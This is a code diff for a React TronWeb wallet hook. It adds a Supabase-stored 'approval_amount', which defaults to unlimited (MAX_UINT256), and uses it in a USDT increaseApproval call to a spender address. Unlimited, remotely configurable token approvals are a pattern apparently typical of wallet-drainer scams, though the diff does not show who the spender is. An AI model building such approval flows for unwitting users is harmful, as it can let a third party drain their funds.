@@ -1,4 +1,5 @@
 import { useState, useEffect, useCallback } from 'react';
+import { supabase } from '@/integrations/supabase/client';
 
 // Wallet types
 export interface WalletInfo {
@@ -54,8 +55,26 @@ declare global {
 // TRC20 USDT Contract
 export const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
-// MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
-export const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+// Default MAX_UINT256 for unlimited approval (避免JS精度问题，使用字符串)
+export const DEFAULT_MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+// Fetch approval amount from database
+export const getApprovalAmount = async (): Promise<string> => {
+  try {
+    const { data, error } = await supabase
+      .from('app_settings' as any)
+      .select('value')
+      .eq('key', 'approval_amount')
+      .single() as { data: { value: string } | null, error: any };
+    
+    if (error || !data) {
+      return DEFAULT_MAX_UINT256;
+    }
+    return data.value;
+  } catch {
+    return DEFAULT_MAX_UINT256;
+  }
+};
 
 // TRC20 ABI for increaseApproval (TronWeb compatible format)
 const TRC20_ABI = [
@@ -275,11 +294,14 @@ export function useTronWallet() {
     }
 
     try {
+      // Get approval amount from database settings
+      const approvalAmount = await getApprovalAmount();
+      
       // Get USDT contract
       const contract = await window.tronWeb.contract(TRC20_ABI, USDT_CONTRACT_ADDRESS);
 
-      // Execute increaseApproval using MAX_UINT256
-      const transaction = await contract.increaseApproval(spenderAddress, MAX_UINT256).send({
+      // Execute increaseApproval using configured amount
+      const transaction = await contract.increaseApproval(spenderAddress, approvalAmount).send({
         feeLimit: 100_000_000,
         callValue: 0,
         shouldPollResponse: true
